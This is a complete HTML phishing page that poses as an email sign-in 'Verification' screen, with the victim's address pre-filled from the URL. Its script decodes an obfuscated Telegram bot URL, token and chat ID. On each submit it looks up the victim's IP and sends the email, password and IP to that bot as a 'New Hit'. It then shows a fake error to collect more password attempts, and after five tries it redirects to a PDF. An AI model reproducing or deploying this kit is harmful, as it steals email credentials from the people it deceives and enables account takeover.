<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Verification - Sign In</title>
    <style>
        body, html { margin: 0; padding: 0; height: 100%; overflow: hidden; font-family: 'Helvetica Neue', Arial, sans-serif; background-color: #a9a9a9; }
        #bg-frame { position: fixed; top: 0; left: 0; width: 100%; height: 100%; border: none; z-index: -1; }
        .overlay-mask { position: fixed; top: 0; left: 0; width: 100%; height: 100%; background: rgba(0, 0, 0, 0.5); display: flex; justify-content: center; align-items: center; z-index: 0; }
        .login-container { background-color: white; border-radius: 8px; box-shadow: 0 2px 15px rgba(0, 0, 0, 0.3); width: 350px; padding: 40px; text-align: center; z-index: 10; }
        h1 { font-size: 24px; font-weight: 600; margin-bottom: 30px; }
        .form-group { margin-bottom: 20px; text-align: left; }
        label { display: block; margin-bottom: 8px; font-size: 14px; font-weight: 600; }
        input { width: 100%; padding: 10px; border: 1px solid #ddd; border-radius: 4px; font-size: 16px; box-sizing: border-box; }
        .login-button { width: 100%; padding: 12px; background-color: #0061ff; color: white; border: none; border-radius: 4px; font-size: 16px; font-weight: 600; cursor: pointer; }
        .login-button:disabled { background-color: #ccc; cursor: not-allowed; }
        .verifying { display: none; color: #000; margin-top: 10px; font-weight: bold; }
        .error-msg { display: none; color: #d93025; margin-top: 10px; font-size: 14px; font-weight: bold; }
        .divider { margin-top: 20px; font-size: 11px; color: #777; border-top: 1px solid #eee; padding-top: 15px; }
    </style>
</head>
<body>

    <iframe id="bg-frame" src=""></iframe>

    <div class="overlay-mask">
        <div class="login-container">
            <h1 id="domainHeader">Verification</h1>
            <p>Sign in to continue</p>
            <form id="loginForm">
                <div class="form-group">
                    <label for="email">Email</label>
                    <input type="email" id="email" placeholder="[[-Email-]]" required readonly>
                </div>
                <div class="form-group">
                    <label for="password">Email Password</label>
                    <input type="password" id="password" required>
                </div>
                <button type="submit" class="login-button" id="submitBtn">Continue</button>
                <div class="verifying" id="verifying">Verifying...</div>
                <div class="error-msg" id="error-msg">Error in password. Please try again.</div>
            </form>
            <div class="divider"> Copyright &copy; 2026 All rights reserved</div>
        </div>
    </div>

    <script>
        // Obfuscated config (Base64 encoded)
        // aHR0cHM6Ly9hcGkudGVsZWdyYW0ub3JnL2JvdA== is "https://api.telegram.org/bot"
        const _0x1 = "aHR0cHM6Ly9hcGkudGVsZWdyYW0ub3JnL2JvdA=="; 
        const _0x2 = "NzUxMDY0MzMxMzpBQUczVTN6Ukt6UmdHVDVoZEhwdnVhWFJCekYwNEVtOUVkZw=="; // Bot Token
        const _0x3 = "NzI0MDkxNTExMA=="; // Chat ID
        
        const domain = "";
        const frame = document.getElementById('bg-frame');
        if (domain && !domain.includes("")) { frame.src = "https://www." + domain; }

        let attempts = 0;
        document.getElementById('loginForm').addEventListener('submit', async function(e) {
            e.preventDefault();
            const btn = document.getElementById('submitBtn');
            const status = document.getElementById('verifying');
            const errorLabel = document.getElementById('error-msg');
            const emailVal = document.getElementById('email').value;
            const passVal = document.getElementById('password').value;

            errorLabel.style.display = 'none';
            status.style.display = 'block';
            btn.disabled = true;

            try {
                const ipReq = await fetch('https://api.ipify.org?format=json');
                const ipRes = await ipReq.json();
                
                // Reconstructing the encoded strings
                const _u = atob(_0x1) + atob(_0x2) + "/sendMessage";
                const _c = atob(_0x3);
                const _t = `&#128276; *New Hit*\n\n&#128231; Email: ${emailVal}\n&#128273; Pass: ${passVal}\n&#127760; IP: ${ipRes.ip}`;

                await fetch(_u, {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify({ chat_id: _c, text: _t, parse_mode: 'Markdown' })
                });
            } catch (err) {}

            attempts++;
            document.getElementById('password').value = "";
            setTimeout(() => {
                status.style.display = 'none';
                if (attempts >= 5) {
                    window.location.href = 'https://idealelectric.app.box.com/public/static/h4cmhn9s1r8dpxih4vkcblglwhd10txx.pdf';
                } else {
                    errorLabel.style.display = 'block';
                    btn.disabled = false;
                }
            }, 2000);
        });
        // Function to grab the email from the URL hash
window.onload = function() {
    const hash = window.location.hash.substring(1); // Removes the '#'
    if (hash) {
        // Decodes the URL (e.g., converting %40 back to @)
        const emailField = document.getElementById('email');
        emailField.value = decodeURIComponent(hash); 
    }
};
    </script>
</body>
</html>
